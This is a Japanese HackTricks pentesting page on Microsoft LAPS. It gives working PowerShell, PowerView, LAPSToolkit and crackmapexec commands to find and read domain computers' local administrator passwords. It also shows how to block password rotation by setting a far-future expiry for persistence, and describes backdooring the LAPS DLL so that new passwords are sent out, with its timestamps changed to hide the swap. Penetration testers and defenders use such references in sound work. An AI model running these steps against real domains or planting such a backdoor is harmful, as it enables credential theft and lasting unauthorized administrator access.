# LAPS

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## 基本情報

Local Administrator Password Solution（LAPS）は、**管理者パスワード**を**一意でランダムで頻繁に変更された**ものに設定し、ドメインに参加したコンピュータに適用するためのツールです。これらのパスワードは、Active Directory内に安全に保存され、アクセス制御リスト（ACL）を介してアクセス権が付与されたユーザのみがアクセスできます。クライアントからサーバへのパスワードの送信のセキュリティは、**Kerberosバージョン5**と**Advanced Encryption Standard（AES）**の使用によって保証されています。

LAPSの実装により、ドメインのコンピュータオブジェクトには、**`ms-mcs-AdmPwd`**と**`ms-mcs-AdmPwdExpirationTime`**という2つの新しい属性が追加されます。これらの属性は、それぞれ**平文の管理者パスワード**と**その有効期限**を保存します。

### アクティブ化されているかどうかを確認
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS パスワードアクセス

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **LAPS ポリシーの生データをダウンロード**し、次に [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使用して、このファイルを人間が読める形式に変換できます。

さらに、**ネイティブ LAPS PowerShell コマンドレット** は、アクセス可能なマシンにインストールされている場合に使用できます：
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView**を使用して、**誰がパスワードを読み取ることができ、それを読み取ることができるか**を調べることもできます。
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)は、複数の機能を備えたLAPSの列挙を容易にします。\
そのうちの1つは、**LAPSが有効になっているすべてのコンピューター**の**`ExtendedRights`**を解析することです。これにより、**LAPSパスワードを読む権限を特定のグループに委任**している**グループ**が表示されます。\
**ドメインにコンピューターを参加させたアカウント**は、そのホストに対して`All Extended Rights`を受け取り、この権利により**パスワードを読む能力**が与えられます。列挙により、ユーザーアカウントがホスト上のLAPSパスワードを読むことができることが示されるかもしれません。これにより、LAPSパスワードを読むことができる特定のADユーザーを**特定する**のに役立ちます。
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexecを使用してLAPSパスワードをダンプする**
PowerShellへのアクセスがない場合、LDAPを介してこの特権を乱用することができます。
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistence**

### **有効期限日**

管理者権限を取得すると、将来の有効期限日を設定することで、パスワードを取得し、マシンがパスワードを更新するのを防ぐことが可能です。
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
**管理者**が**`Reset-AdmPwdPassword`**コマンドレットを使用するか、LAPS GPOで**ポリシーで必要な以上のパスワード有効期限を許可しない**が有効になっている場合、パスワードはリセットされます。
{% endhint %}

### バックドア

LAPSの元のソースコードは[こちら](https://github.com/GreyCorbel/admpwd)で見つけることができます。そのため、コード内（たとえば`Main/AdmPwd.PS/Main.cs`の`Get-AdmPwdPassword`メソッド内）にバックドアを設置して、新しいパスワードを何らかの方法で**外部に送信したり、どこかに保存**することが可能です。

その後、新しい`AdmPwd.PS.dll`をコンパイルして、`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`にアップロードします（および変更日時を変更します）。

## 参考文献
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れます
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**することで、あなたのハッキングトリックを共有してください。

</details>
